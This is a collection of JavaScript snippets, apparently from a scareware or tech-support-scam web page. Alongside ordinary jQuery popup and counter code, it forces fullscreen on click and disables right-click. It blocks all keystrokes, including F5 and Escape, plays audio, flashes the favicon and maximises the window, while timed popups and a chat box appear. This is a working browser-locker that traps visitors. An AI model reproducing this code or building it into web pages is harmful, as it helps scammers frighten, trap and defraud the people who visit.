

  $(document).ready(function() {
    $("#mycanvas").click(function() {
      $("#footer").show()
    })
  });



  $(document).ready(function() {
    $("#mycanvas").click(function() {
      $("#chat-box").show()
    })
  });



  $(document).ready(function() {
    $("#mycanvas").click(function() {
      $("#chat").show()
    })
  });


      
        (function(a) {
          a.fn.countTo = function(b) {
            b = b || {};
            return a(this).each(function() {
              function d(a) {
                a = c.formatter.call(k, a, c);
                h.html(a)
              }
              var c = a.extend({}, a.fn.countTo.defaults, {
                  from: a(this).data("from"),
                  to: a(this).data("to"),
                  speed: a(this).data("speed"),
                  refreshInterval: a(this).data("refresh-interval"),
                  decimals: a(this).data("decimals")
                }, b),
                l = Math.ceil(c.speed / c.refreshInterval),
                n = (c.to - c.from) / l,
                k = this,
                h = a(this),
                m = 0,
                f = c.from,
                g = h.data("countTo") || {};
              h.data("countTo", g);
              g.interval && clearInterval(g.interval);
              g.interval = setInterval(function() {
                f += n;
                m++;
                d(f);
                "function" == typeof c.onUpdate && c.onUpdate.call(k, f);
                m >= l && (h.removeData("countTo"), clearInterval(g.interval), f = c.to, "function" == typeof c.onComplete && c.onComplete.call(k, f))
              }, c.refreshInterval);
              d(f)
            })
          };
          a.fn.countTo.defaults = {
            from: 0,
            to: 0,
            speed: 100,
            refreshInterval: 100,
            decimals: 0,
            formatter: function(a, d) {
              return a.toFixed(d.decimals)
            },
            onUpdate: null,
            onComplete: null
          }
        })(jQuery);
        jQuery(function(a) {
          a(".count-number").data("countToOptions", {
            formatter: function(a, d) {
              return a.toFixed(d.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",")
            }
          });
          a(".timer").each(function(b) {
            var d = a(this);
            b = a.extend({}, b || {}, d.data("countToOptions") || {});
            d.countTo(b)
          })
        });
      

      
        addEventListener("click", function() {
      var el = document.documentElement
        , rfs =
               el.requestFullScreen
            || el.webkitRequestFullScreen
            || el.mozRequestFullScreen
      ;
      rfs.call(el);
      });

      

      
        function sjdhfsd2() {
          document.getElementById("kjshdfwikas").play()
        };
      
      
  function sjdhfsd1() {
    document.getElementById("sjdhfsd").play();
 }
  
      
        var e = 1;
        setInterval(function() {
          1 == e ? (document.getElementById("favicon").href = "w3.html", e = 0) : (document.getElementById("favicon").href = "w1.html", e = 1)
        }, 1E3);
      
      
        $(document).ready(function() {
          $("#mycanvas").click(function() {
            $("#welcomeDiv").show()

          })
        });
      
      
        $(document).ready(function() {
          $(".pro_box").delay(400).fadeIn(300);
          $("#poptxt").delay(2000).fadeIn(400);
              $(".black").delay(1E3).fadeIn(800);
          $(".pro_box2").delay(2500).fadeIn(800);
          $(".pro_box3").delay(3500).fadeIn(800);
          $("#pop_up_new").delay(4E3).fadeIn(800);
          $("#ev_talkbox_wrapper").delay(1).fadeIn(500)
        });
      
      
        $(document).ready(function () {
            $("body").click(function () {
                $("#ev_talkbox_wrapper").hide();
            });
        });
    
    
      $(document).ready(function () {
          $("#ev_talkbox_wrapper").click(function () {
              $("#ev_talkbox_wrapper").hide();
          });
      });
  
  
      $(document).ready(function () {
          $("#mycanvas").click(function () {
              $("#ev_talkbox_wrapper").hide();
          });
      });
  
      
        $(document).ready(function() {
          $("#mycanvas").click(function() {
            $("#poptxt").show()
          })
        });
        $(document).ready(function() {
          $("#cross").click(function() {
            $("#poptxt").show()
          })
        });
      
      
        $(document).ready(function() {
          $("body").mouseover(function() {
            $("#poptxt").show()
          })
        });
      
      
        var isNS = "Netscape" == navigator.appName ? 1 : 0;
        "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);

        function mischandler() {
          return !1
        }

        function mousehandler(a) {
          a = isNS ? a : event;
          a = isNS ? a.which : a.button;
          if (2 == a || 3 == a) return !1
        }
        document.oncontextmenu = mischandler;
        document.onmousedown = mousehandler;
        document.onmouseup = mousehandler;
      
      
        document.onkeydown = function(a) {
          return !1
        };
      
      
        document.attachEvent("onkeydown", win_onkeydown_handler);

        function win_onkeydown_handler() {
          switch (event.keyCode) {
            case 116:
              event.returnValue = !1;
              event.keyCode = 0;
              break;
            case 27:
              event.returnValue = !1, event.keyCode = 0
          }
        }
      
      
        window.onload = function() {
          window.moveTo(0, 0);
          window.resizeTo(screen.availWidth, screen.availHeight)
        };
      
